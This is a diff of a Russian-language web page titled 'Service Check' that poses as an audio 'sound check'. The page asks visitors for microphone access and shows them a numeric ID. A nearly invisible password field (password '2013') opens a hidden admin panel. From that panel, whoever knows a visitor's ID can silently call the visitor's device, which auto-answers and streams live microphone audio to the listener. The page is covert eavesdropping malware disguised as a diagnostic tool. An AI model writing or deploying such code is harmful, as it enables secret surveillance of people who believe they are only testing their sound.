@@ -2,93 +2,80 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Система проверки связи</title>
+    <title>Service Check</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: sans-serif; background: #111; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #222; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 320px; }
-        button { background: #0070f3; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
-        input { background: #111; border: 1px solid #444; color: #0f0; padding: 10px; width: 90%; margin-top: 10px; text-align: center; }
-        #id-box { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; display: none; border: 1px solid #0f0; }
-        .admin-zone { margin-top: 30px; border-top: 1px solid #444; padding-top: 20px; display: none; }
+        body { font-family: sans-serif; background: #0a0a0a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #111; padding: 30px; border-radius: 12px; text-align: center; border: 1px solid #333; width: 300px; }
+        button { background: #0070f3; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-bottom: 10px; }
+        input { background: #000; border: 1px solid #444; color: #0f0; padding: 10px; width: 85%; margin-top: 10px; text-align: center; font-family: monospace; }
+        #display-id { font-size: 32px; color: #0f0; margin: 15px 0; font-family: monospace; display: none; }
+        .admin { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="user-interface">
-        <h2>Проверка аудио</h2>
-        <p>Нажмите кнопку, чтобы получить доступ к системе</p>
-        <button onclick="activate()">УЗНАТЬ МОЙ ID</button>
-        <div id="id-box"></div>
+<div class="box">
+    <div id="user-side">
+        <h3>Проверка звука</h3>
+        <button onclick="startClient()">ВКЛЮЧИТЬ ПРОВЕРКУ</button>
+        <div id="display-id"></div>
     </div>
 
-    <input type="password" id="master-pass" placeholder="..." oninput="checkAdmin(this.value)" style="opacity: 0.2; width: 40px; margin-top: 50px;">
+    <input type="password" id="p" placeholder="..." oninput="if(this.value=='2013')showAdmin()" style="opacity:0.1; width:30px;">
 
-    <div id="admin-panel" class="admin-zone">
-        <h3 style="color: #0f0;">ADMIN PANEL</h3>
-        <input type="text" id="target-id" placeholder="Вставьте ID устройства">
-        <button onclick="startListening()" style="background: #222; border: 1px solid #0f0; color: #0f0;">СЛУШАТЬ</button>
-        <div id="status" style="margin-top: 10px; font-size: 12px;"></div>
+    <div id="admin-panel" class="admin">
+        <h3 style="color:#0f0">ADMIN</h3>
+        <input type="number" id="tid" placeholder="Цифровой код">
+        <button onclick="connect()" style="background:#222; border:1px solid #0f0; color:#0f0; margin-top:10px;">СЛУШАТЬ</button>
+        <div id="stat" style="font-size:12px; margin-top:10px;"></div>
     </div>
 </div>
 
-<audio id="player" autoplay></audio>
+<audio id="audio" autoplay></audio>
 
 <script>
-    let myPeer;
-    const myId = 'dev-' + Math.floor(Math.random() * 90000 + 10000);
+    let peer;
+    // Генерируем только цифры (например, от 10000 до 99999)
+    const shortId = Math.floor(Math.random() * 90000) + 10000;
 
-    // Функция для обычного пользователя
-    function activate() {
-        myPeer = new Peer(myId);
+    function startClient() {
+        // Создаем подключение с цифровым ID
+        peer = new Peer(shortId);
         
-        myPeer.on('open', (id) => {
-            document.getElementById('id-box').innerText = "ID: " + id;
-            document.getElementById('id-box').style.display = 'block';
+        peer.on('open', (id) => {
+            document.getElementById('display-id').innerText = id;
+            document.getElementById('display-id').style.display = 'block';
         });
 
-        // Запрашиваем микрофон
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                console.log("Микрофон готов");
-                // Ждем звонка от админа
-                myPeer.on('call', call => {
-                    call.answer(stream);
-                });
-            })
-            .catch(err => alert("Ошибка: Нужен доступ к микрофону!"));
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+            peer.on('call', call => {
+                call.answer(stream); // Отвечаем мгновенно
+            });
+        }).catch(e => alert("Доступ запрещен"));
     }
 
-    // Функция входа в админку по паролю 2013
-    function checkAdmin(val) {
-        if (val === '2013') {
-            document.getElementById('admin-panel').style.display = 'block';
-            document.getElementById('master-pass').style.display = 'none';
-            if (!myPeer) myPeer = new Peer('admin-' + Math.floor(Math.random() * 999));
-        }
+    function showAdmin() {
+        document.getElementById('admin-panel').style.display = 'block';
+        document.getElementById('p').style.display = 'none';
+        if(!peer) peer = new Peer(); // Если зашел сразу как админ
     }
 
-    // Функция подключения к чужому микрофону
-    function startListening() {
-        const tid = document.getElementById('target-id').value;
-        const stat = document.getElementById('status');
-        stat.innerText = "Подключение...";
-
-        const call = myPeer.call(tid, null); // Звоним без своего звука
+    function connect() {
+        const target = document.getElementById('tid').value;
+        const s = document.getElementById('stat');
+        s.innerText = "Связь...";
         
+        const call = peer.call(target, null);
         call.on('stream', remoteStream => {
-            stat.innerText = "СВЯЗЬ УСТАНОВЛЕНА";
-            stat.style.color = "#0f0";
-            document.getElementById('player').srcObject = remoteStream;
+            s.innerText = "ONLINE";
+            s.style.color = "#0f0";
+            document.getElementById('audio').srcObject = remoteStream;
         });
-
-        call.on('error', err => {
-            stat.innerText = "Ошибка: ID не найден";
-            stat.style.color = "red";
-        });
+        call.on('error', () => { s.innerText = "Ошибка ID"; });
     }
 </script>
 
 </body>
 </html>
+
